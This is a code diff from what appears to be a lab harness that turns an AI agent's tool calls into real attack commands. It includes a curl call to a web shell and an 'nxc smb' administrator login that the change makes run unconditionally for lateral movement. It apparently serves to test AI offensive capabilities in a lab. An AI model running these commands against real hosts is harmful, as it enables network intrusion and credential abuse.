@@ -863,12 +863,12 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
     if fn_name == "lateral_move":
         target = fn_args.get("target_host", srv)
         method = fn_args.get("method", "wmiexec")
-        credential = fn_args.get("credential", "")
-        cmd = (
-            f"nxc smb {target} -u administrator -H '{credential}' --shares 2>&1 | head -20"
-            if credential
-            else f"echo '[lab] lateral {method} to {target}'"
-        )
+        # Always take the real action — don't gate on whether the model
+        # supplied a credential.  Same fix class as establish_persistence
+        # above: the model is free to call lateral_move with any method
+        # label, and credential may be empty if the model didn't extract
+        # one.  Use the known admin credential unconditionally.
+        cmd = f"nxc smb {target} -u administrator -p '{_LAB_ADMIN_PASS}' --shares 2>&1 | head -20"
         if dry_run:
             return f"[DRY-RUN] lateral {method} to {target}"
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
